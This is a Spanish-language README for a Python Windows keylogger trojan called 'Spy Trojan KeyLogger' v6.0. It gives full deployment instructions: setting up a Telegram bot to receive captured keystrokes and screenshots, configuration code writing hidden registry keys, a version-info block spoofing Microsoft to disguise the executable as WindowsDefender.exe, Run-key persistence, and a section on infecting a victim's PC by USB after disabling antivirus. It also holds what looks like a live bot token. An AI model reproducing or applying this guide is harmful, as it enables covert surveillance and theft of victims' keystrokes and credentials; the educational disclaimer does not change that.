````
█▀ █▀█ █▄█   ▀█▀ █▀█ █▀█   █ ▄▀█ █▄ █   █▄▀ █▀▀ █▄█ █   █▀█ █▀▀ █▀▀ █▀▀ █▀█
▄█ █▀▀  █     █  █▀▄ █▄█ █▄█ █▀█ █ ▀█   █ █ ██▄  █  █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v6.0  
````

---
# __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general, el aprendizaje de ___"Seguridad en sistemas informáticos"___, el creador no se hace responsable por un posible mal uso de ésta herramienta.
---



## Información
* __Developed by:__ `SebastianEPH`
* __Product name:__ `Spy Trojan KeyLogger`
* __Type software:__ `Trojan`
* __File version:__ `v6.0`
* __Architecture:__ `x86 bits || x64 bits`
* __State:__ `Stable`
* __Size:__ `NULL`
* __Undetectable:__ `Not Tester`
* __Plataform:__ `Only Windows 7, 8.1, 10`
* __Programming language:__ `Python >3.6 <3.9`
* __Licence:__ `GNU Licence`
* __IDE or text editor:__ `PyCharm 2020 Education`
* __Documentation date:__ `11/12/20`
* __Description:__ `Advanced Keylogger | send Telegram bot  `


# __¡ Nota importante !:__ Ésta documentación está en proceso de escritura... algunos datos no están completas

<!--#region Carpeta Principal  -->
# Carpeta Principal
![Archivos](https://imgur.com/eGfbb26.png)

* __.git:__` Lista de cambios` _<= ignorar_
* __.idea:__` Información del IDE` _<= ignorar_
* __Doc:__` Web => en proceso...` _<= ignorar_
* __venv:__`Entorno_virtual de python ` _<= ignorar_
* __# Create .EXE [InfectionFile]-[Debug].bat:__` Convierte en ejecutable *.exe, pero al iniciarlo se mostrará la consola` _<= para uso de debuggeo_
* __# Create .EXE [InfectionFile]-[Release].bat:__` Convierte en ejecutable, y al iniciarlo, será de modo oculto, sin Consola` _<= Es el proyecto finalizado_
* __# Create .EXE [SpyTrojan]-[Debug].bat:__` Convierte en ejecutable *.exe, pero al abrirlo se mostrará la consola` _<= para uso de debuggeo_
* __# Create .EXE [SpyTrojan]-[Release].bat:__` Convierte en ejecutable, y al iniciarlo, será de modo oculto, sin Consola` _<= Es el proyecto finalizado_
* __#=[Infection] Run.bat:__` Ejecuta en consola el archivo InfectionFile` _<= para uso de debuggeo_
* __#=[SpyTrojan] Run.bat:__` Ejecuta en consola el archivo SpyTrojan` _<= para uso de debuggeo_
* __.gitignore:__` Lista de archivos y carpetas sin seguimiento` _<= ignorar_
* __ConfigKey.ini:__` Archivo de configuración del keylogger` _<= No habilitado en está versión_
* __icon_infection_file.ico:__` Icono InfectionFile` _<= puedes remplazarlo, pero no cambiarle de nombre_
* __icon_SpyTrojan.ico:__` Icono SpyTrojan` _<= puedes remplazarlo, pero no cambiarle de nombre_
* __InfectionFile .py:__` Este script se encargará de infectar la computadora, y escribir en el registro.`_<= Se debe configurar previamente_
* __info_exe_InfectionFile.txt:__` Contiene la información del *.exe` _<= lee la documentación_
* __info_exe_SpyTrojan.txt:__` Contiene la información del *.exe` _<= lee la documentación_
* __InstallRequirements.bat:__` Instala las bibliotecas` _<= Puede instalarlos manualmente_
* __LICENSE__
* __README .md:__` Documentación`
* __SpyTrojan .py:__` Keyloggger TelegramBot`
---
<!--#endregion -->

<!--#region Caracteristicas  -->
# Caracteristicas
- __Segundo plano:__ Este keylogger, al ejecutarse en la linea de comando, sí mostrará una consola, solo por detalles de debuggeo, pero al ser compilada de `*.py` a `*.exe` el ejecutable resultante se ejecutará en segundo plano

    `NOTA: imagen no actual`

    ![Segundo plano](https://i.imgur.com/DFAf2Tw.png)

- __Disfraz:__ Al momento de ser convertido de `*.py a *.exe`. El Keylogger será disfrazado como `WindowsDefender.exe` con el ícono y la información del programa.

    `NOTA: imagen no actual`

    ![ExeCompilado](https://i.imgur.com/TlBEAaS.png)

    ![Info](https://i.imgur.com/MQAiVnJ.png) 
    ![Info](https://i.imgur.com/mTBByRy.png)

    ![StartUP Info](https://i.imgur.com/bkGSFQC.png)
- __Oculto__ 

- __Iniciar automaticamente con el sistema:__ Modifica el registro de windows, 

    `NOTA: imagen no actual`

    ![StartUp](https://i.imgur.com/xh91bR5.png)

- __Multiples cuentas:__ Soporte a multiples cuentas 
- __Envio mediante Bot Telegram:__ Envia todos los datos mediante telegram
- __Screenshot:__ Toma capturas de pantalla con un intervalo personalizado 
    ![](https://i.imgur.com/NpNzd4b.png)

    ![](https://i.imgur.com/r2otz8z.png)
<!--#endregion -->

<!--#region Uso de Recursos  -->
## Uso de Recursos de la PC
El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución

![Uso del CPU y RAM](https://i.imgur.com/DFAf2Tw.png)

---
<!--#endregion -->

# Proceso de preparación:

<!--#region Instalar todos los requerimientos -->
## 1. Instalar todos los requerimientos

![lista de requerimientos](https://imgur.com/PPgsmrH.png)
<!--#endregion -->

<!--#region Configuración de Telegram  -->
## 2. Crear y configurar un Bot de telegram Telegram

1. Entramos a [BotFather](https://telegram.me/BotFather).
    
    ![botFather](https://i.imgur.com/1dtdBO6.png)

2. Creamos un nuevo bot y obtenemos el Token privado
    
    ![](https://i.imgur.com/oRYutuu.png)

3. Ahora obtenemos nuestro `Chat ID`, esto se realiza para que solo el registro de teclas nos llegue a nosotros y no a cualquiera que encuentre el bot.

4. Buscamos el Bot llamado [Chat ID Echo](https://telegram.me/chatid_echo_bot) y obtenemos nuestro Chat ID
    
    ![CHAT ID](https://i.imgur.com/tJttP3i.png)

5. Buscamos nuestro bot y la iniciamos...

    ![Buscando nuestro bot](https://i.imgur.com/2IA7ec8.png)

    ![iniciando bot](https://i.imgur.com/1r9F2IU.png)

6. Ejemplo del funcionamiento

    ![Ejemplo de funcionamiento telegram](https://i.imgur.com/QHLYDi9.png)

<!--#endregion -->

<!--#region Crear ejecutable del `SpyTrojan.py -->
## 3. Crear ejecutable del `SpyTrojan.py` 

* __Paso 1:__  Abrir el archivo y remplazar la infomación según tus requerimientos.txt

    ![lista de requerimientos](https://imgur.com/7KYSyiY.png)

    <details>
            <summary> Click para ver el contenido del archivo.</summary>

    ````r
    VSVersionInfo(
        ffi=FixedFileInfo(
            filevers=(6, 1, 7601, 17514),
            prodvers=(6, 1, 7601, 17514),
            mask=0x3f,
            flags=0x0,
            OS=0x40004,
            fileType=0x1,
            subtype=0x0,
            date=(0, 0)
            ),
        kids=[
            StringFileInfo(
            [
            StringTable(
                u'040904B0',
                [StringStruct(u'CompanyName', u'Microsoft Corporation'),
                StringStruct(u'FileDescription', u'Security Health Host Key'),
                StringStruct(u'FileVersion', u'6.1.7601.17514 (win7sp1_rtm.101119-1850)'),
                StringStruct(u'InternalName', u'Windows Security Health Host Key'),
                StringStruct(u'LegalCopyright', u'\xa9 Microsoft Corporation. All rights reserved.'),
                StringStruct(u'OriginalFilename', u'SecurityHealthHostKey.exe'),
                StringStruct(u'ProductName', u'Microsoft\xae Windows\xae Operating System'),
                StringStruct(u'ProductVersion', u'6.1.7601.17514')])
            ]), 
            VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
        ]
    )
    ````

    ### Estos datos serán utilizados al momento de convertir nuestro *.py a *.exe

    ![Info](https://i.imgur.com/MQAiVnJ.png) 
    ![Info](https://i.imgur.com/mTBByRy.png)

</details> 

* __Paso 2:__  Convertir *.py a *.exe

    ![](https://imgur.com/1M7P0aW.png)

    <p>El archivo <code># Create .EXE [SpyTrojan]-[Debug].bat</code> nos dará como resultado un *.exe pero al ejecutar el programa se mostrará la consola, con la finalidad de debuggear el programa</p>
    <p> El archivo <code># Create .EXE [SpyTrojan]-[Release].bat</code> es el software final, está se ejeuctará en segundo plano sin entorno grafico o consola. </p>
    <br>
    <b>El ejecutable resultante se guardará en una carpeta con los nombres <code>[DEBUG]</code>, <code>[RELEASE]</code> según sea el caso.</b>
 

* __Nota:__  Al abrir el *.exe resultante, ésta mandará error lo cuál es normal ya que el software lee información del registro `[REGEDIT]`, información que todavía no se han creado.

<!--#endregion -->

<!--#region Crear ejecutable del `InfectionFile.py -->
## 4. Crear ejecutable del `InfectionFile.py` 

Este Archivo se encargará de escribir en el registro de windows la configuración de nuestro software, 
según estos datos, el software funcionará de una u otra manera. 

* __Paso 1:__  Abrir el archivo `InfectionFile.py` para edidarlo.
    
    <details>
    <summary> Ver código completo</summary>
    
    ````py
    if __name__ == '__main__':
        # Se habilitarán futuras actualizaciones
        AutoDestruction(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\AutoDestruction',
                        active=0,
                        active_now=0,  # ignore, will be used in a future update
                        day=00,
                        year=0000
                        ).set_values()
        BombWindows(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\BombWindows',
                    active=0,
                    active_now=0,   # ignore, will be used in a future update
                    day=00,
                    year=0000
                    ).set_values()
        Keylogger(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Keylogger',
                active=1,         #Cambie Aquí#
                limit=150         #Cambie Aquí#
                ).set_values()
        Screenshot(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot',
                active=1,        #Cambie Aquí#
                intervalSeconds=15,#Cambie Aquí#
                cache_path='C:\\Users\\' + str(os.getlogin()) + r'\AppData\Local\Microsoft\Office\16.0\Floodgate\temp'
                ).set_values()
        TelegramBot(path_registry=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot',
                    id=["-1001322369309"],  #Cambie Aquí#
                    token="1345614169:AAE7O_jRBhIkq_minXh52Ws2SV3wlPfp8QM", #Cambie Aquí#
                    ).set_values()
        trojan = Trojan(path_registry=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide',
                        debug=0,
                        delay=0,
                        path_software='C:\\Users\\' + str(os.getlogin()) + r'\AppData\Local\Microsoft\Windows\Shell\temp',
                        name_software= 'SpyTrojan.exe', #Cambie Aquí#
                        username=str(os.getlogin())
                        )
        trojan.set_values()
        trojan.infection()
    ````
</details> 

* __Paso 2:__  Cambiar configuración del `AutoDestruction # No disposible en ésta versión`

    <details>
    <summary> Ver código</summary>

    ![](https://imgur.com/aPNBra0.png)

    ````py
    AutoDestruction(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\AutoDestruction',
                        active=0,       # No disposible en ésta versión
                        active_now=0,   # No disposible en ésta versión
                        day=00,         # No disposible en ésta versión
                        year=0000       # No disposible en ésta versión
                        ).set_values()
    ````

</details> 

* __Paso 3:__  Cambiar configuración del `BombWindows # No disposible en ésta versión`

    <details>
    <summary> Ver código</summary>

    ![](https://imgur.com/zqVuye3.png)

    ````py
    BombWindows(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\BombWindows',
                    active=0,   # No disposible en ésta versión
                    active_now=0,   # No disposible en ésta versión
                    day=00,         # No disposible en ésta versión
                    year=0000       # No disposible en ésta versión
                    ).set_values()
    ````
</details> 

* __Paso 4:__  Cambiar configuración del `Keylogger`

    <details>
    <summary> Ver código</summary>

    ![](https://imgur.com/4y9GVdF.png)

    ````py
    Keylogger(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Keylogger',
                active=1,         # Keylogger Habilitado = 1 °° Keylogger Habilitado = 1
                limit=150         # Limite de caracteres, al llegal al limite, envía el registro de teclas,el limite no puede pasar de 2000
                ).set_values()
    ````

</details> 


* __Paso 5:__  Cambiar configuración de `Screenshot`

    <details>
    <summary> Ver código</summary>

    ![](https://imgur.com/BUrOyKn.png)

    ````py
    Screenshot(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot',
                active=1,           # Screenhot Habilitado = 1 °° screenshot Habilitado = 1
                intervalSeconds=15, # Intervalo en segundos de capturas de pantalla
                cache_path='C:\\Users\\' + str(os.getlogin()) + r'\AppData\Local\Microsoft\Office\16.0\Floodgate\temp'
                ).set_values()
    ````

</details> 

* __Paso 6:__  Cambiar configuración de `TelegramBot`

    <details>
    <summary> Ver código</summary>

    ![](https://imgur.com/b2JM7tt.png)

    ````py
    TelegramBot(path_registry=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot',
                    id=["-1001322369457"],  # <= Ingrese su ID personal, o el ID de un grupo de telegram
                    token="1345614169:AAE7O_jRBhIkq_minXh52Ws2SV3wlPfp8QM", # <= Ingrese token del bot
                    ).set_values()
    ````

</details> 

* __Paso 7:__  Cambiar configuración de `Software General`

    <details>
    <summary> Ver código</summary>

    ![](https://imgur.com/IVJl4NH.png)

    ````py
    trojan = Trojan(path_registry=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide',
                        debug=0,    # No disposible en ésta versión
                        delay=0,    # No disposible en ésta versión
                        path_software='C:\\Users\\' + str(os.getlogin()) + r'\AppData\Local\Microsoft\Windows\Shell\temp', # No cambiar
                        name_software= 'SpyTrojan.exe', # <= Ingrese el nombre del exe generado anteriormente:
                        # Ejemplo: "SpyKeylogger.exe"
                        username=str(os.getlogin()) # No cambiar
                        )
        trojan.set_values()
        trojan.infection()
    ````

</details> 


* __Paso 8:__  Abrir el archivo y remplazar la infomación según tus requerimientos.txt

    ![lista de requerimientos](https://imgur.com/q79rmJb.png)

    <details>
            <summary> Click para ver el contenido del archivo.</summary>

    ````r
    VSVersionInfo(
        ffi=FixedFileInfo(
            filevers=(6, 1, 7601, 17514),
            prodvers=(6, 1, 7601, 17514),
            mask=0x3f,
            flags=0x0,
            OS=0x40004,
            fileType=0x1,
            subtype=0x0,
            date=(0, 0)
            ),
        kids=[
            StringFileInfo(
            [
            StringTable(
                u'040904B0',
                [StringStruct(u'CompanyName', u'Microsoft Corporation'),
                StringStruct(u'FileDescription', u'Security Health Host Key'),
                StringStruct(u'FileVersion', u'6.1.7601.17514 (win7sp1_rtm.101119-1850)'),
                StringStruct(u'InternalName', u'Windows Security Health Host Key'),
                StringStruct(u'LegalCopyright', u'\xa9 Microsoft Corporation. All rights reserved.'),
                StringStruct(u'OriginalFilename', u'SecurityHealthHostKey.exe'),
                StringStruct(u'ProductName', u'Microsoft\xae Windows\xae Operating System'),
                StringStruct(u'ProductVersion', u'6.1.7601.17514')])
            ]), 
            VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
        ]
    )
    ````

    ### Estos datos serán utilizados al momento de convertir nuestro *.py a *.exe

    ![Info](https://i.imgur.com/MQAiVnJ.png)
    ![Info](https://i.imgur.com/mTBByRy.png)

</details> 

* __Paso 9:__  Convertir *.py a *.exe

    ![](https://imgur.com/1M7P0aW.png)

    <p>El archivo <code># Create .EXE [InfectionFile]-[Debug].bat</code> nos dará como resultado un *.exe pero al ejecutar el programa se mostrará la consola, con la finalidad de debuggear el programa</p>
    <p> El archivo <code># Create .EXE [InfectionFile]-[Release].bat</code> es el software final, está se ejeuctará en segundo plano sin entorno grafico o consola. </p>
    <br>
    <b>El ejecutable resultante se guardará en una carpeta con los nombres <code>[DEBUG]</code>, <code>[RELEASE]</code> según sea el caso.</b>

<!--#endregion -->


__NOTA:__ Como requisito mínimo para el aprendizaje de ésta herramienta es saber programar en __Python básico__.



# Modo Debugger
Si ya configuró o bien la base de datos, Gmail o Telegram, si deseas saber si todo está Ok, pues ejecuta el archivo `Ejecuta.bat`, esta ejecutará el `SpyTrojanKeylogger.py` en modo debugg, la cual mostrará información en la consola:
- Mensaje de Error o Exito de __[StartUp]__ 
- Mensaje de Error o Exito de la caracteristica __`Trojan`__
- Teclas oprimidas a tiempo real
- Mensaje de Error o Exito al envía el registro por Gmail
- Mensaje de Error o Exito al conectarse con la base de datos.
- Mensaje de Error o Exito al envíar el registro mediante Telegram
- Otros posibles errores de __`import lib`__

 __[Si tiene problemas con las librerías intenta reinstalar python e instalar las librerías manualmente.]__

![asd](https://i.imgur.com/1jfgC0O.png)

# Convertir `*.py` a `*.exe`
Una vez todo configurado, lo siguiente es convertir nuestro archivo `py` a un `exe`  y en el proceso disfrazarlo.

- Ejecutamos el archivo:
    
    ![Compile.bat](https://i.imgur.com/RU12Dsy.png)

    ![Compile ejecutandose](https://i.imgur.com/weGPkTn.png)

- Luego de terminar aparecerá en la consola `Press any key to continue...`

    ![Complile.bat terminado](https://i.imgur.com/GHBtZKI.png)
- Regresamos a la carpeta principal y notamos que tenemos nuevas carpetas y archivos, las cuales son archivos caché sin ninguna importancia, donde e encuentrá nuestro troyano es dentro de la carpeta `EXE Final`.

    ![Carpeta final](https://i.imgur.com/ljoZLXJ.png)

- Compilación terminada:

    ![](https://i.imgur.com/V0MI65n.png)


# Método de infección:
___¿Cómo infecto a la victima?___

![Final files](https://i.imgur.com/TlBEAaS.png)

__Nota:__ No cambiar de nombre al archivo `WindowsDefender.exe`, si usted le cambia el nombre, el Keylogger quedará obsoleto.
- Usten guardará el archivo en un USB.
- Conectará el __USB__ a la __[PC]__ a infectar.
- Se recomienda desactivar el antivirus o agregar una exclusión en al siguiente ruta: `"C:\Users\Public\Security\Windows Defender"`.
- Lo siguiente es ejecutar el archivo `WindowsDefender.exe` en el USB, el Keylogger se replicará en la siguiente ruta `"C:\Users\Public\Security\Windows Defender"`, Se recomienda no sacar el USB al instante ya que el `Keylogger` se estará replicando en la ruta.

__NOTA:__ Al ejecutar el archivó, ésta automaticamente modificará el registro de windows para que se inicie siempre al prender la computadora.

El Keylogger modificará la siguiente ruta del registro `"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"` por lo cual necesitará permisos de administrador, por ende se recomienda que la primera ejecución se realice con permisos de administrador, en caso de que no lo ejecute con permisos de administrador, el Keylogger modificará la siguiente ruta `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"`

__Explicación:__ 
* `HKEY_LOCAL_MACHINE:` El Keylogger se ejecutará en todos los usuarios exitentes y los nuevos usuarios de la computadora
* `HKEY_CURRENT_USER:` El Keylogger solo se ejecutará en el usuario actual, si se llegará a crear otro usuario, el Keylogger Solo funcionará en el usuario principal
<!-- Creador  -->
---

## Lista de Cambios de la Verión 5 al 6
````r
[-] Se eliminó soporte de envio mediante una conexión a base de datos
[-] Se eliminó soporte de envio mediante Gmail
[-] 
[+]

````


## Bibliotecas personales utilizadas:
- [CRUD RegeditWin](https://github.com/SebastianEPH/CRUD_RegeditWin_Python3) for Python 3

## By SebastianEPH
__Nota:__ Contacteme solo si encontró un bug o desea aportar al repositorio.

- [Website](https://sebastianeph.github.io/)
- [Github](https://github.com/SebastianEPH)
- [Facebook](https://www.facebook.com/SebastianEPH)
- [Telegram](https://t.me/sebastianeph)